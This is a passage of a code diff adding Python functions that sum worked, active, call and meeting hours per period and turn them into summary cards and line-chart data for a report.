+        # Calculate calls_hours as the sum of incoming_hours and outgoing_hours
+        incoming_h, incoming_m = map(int, period['incoming_hours'].replace('h ', ':').replace('m', '').split(':'))
+        outgoing_h, outgoing_m = map(int, period['outgoing_hours'].replace('h ', ':').replace('m', '').split(':'))
+        totals['calls_hours'] += (incoming_h + outgoing_h) * 60 + (incoming_m + outgoing_m)
+
+    # Convert time totals back to string format
+    for key in totals.keys():
+        hours, minutes = divmod(totals[key], 60)
+        totals[key] = f"{hours}h {minutes}m"
+
+    return [
+        {
+            "value": totals["total_hours"],
+            "label": "Total Hours",
+            "datatype": "Data"
+        },
+        {
+            "value": totals["active_hours"],
+            "label": "Active Hours",
+            "datatype": "Data",
+        },
+        {
+            "value": totals["calls_hours"],
+            "label": "Calls Hours",
+            "datatype": "Data",
+        },
+        {
+            "value": totals["meetings_hours"],
+            "label": "Meetings Hours",
+            "datatype": "Data",
+        }
+    ]
+
+def get_chart_data(summarized_data):
+    labels = []
+    total_hours = []
+    active_hours = []
+    calls_hours = []
+    meetings_hours = []
+
+    for period in summarized_data:
+        labels.append(f"{period['starting_date']} to {period['ending_date']}")
+        
+        # Convert time strings to float hours for better visualization
+        total_hours.append(time_str_to_float(period['total_hours']))
+        active_hours.append(time_str_to_float(period['active_hours']))
+        calls_hours.append(time_str_to_float(period['incoming_hours']) + time_str_to_float(period['outgoing_hours']))
+        meetings_hours.append(time_str_to_float(period['meetings_hours']))
+
+    return {
+        "data": {
+            "labels": labels,
+            "datasets": [
+                {"name": "Total Hours", "values": total_hours},
+                {"name": "Active Hours", "values": active_hours},
+                {"name": "Calls Hours", "values": calls_hours},
+                {"name": "Meetings Hours", "values": meetings_hours}
+            ]
+        },
+        "type": "line",
+        "height": 300,
+        "colors": ["#7cd6fd", "#5e64ff", "#ffa00a", "#ff5858"],
+        "axisOptions": {
+            "xAxisMode": "tick",
+            "xIsSeries": 1
+        },
+        "barOptions": {
+            "spaceRatio": 0.2
+        },
+        "scrollable": True,
+        "scrollHeight": 300,
+        "scrollWidth": 1000
+    }
+
+def time_str_to_float(time_str):
+    hours, minutes = map(int, time_str.replace('h ', ':').replace('m', '').split(':'))
+    return round(hours + minutes / 60, 2)
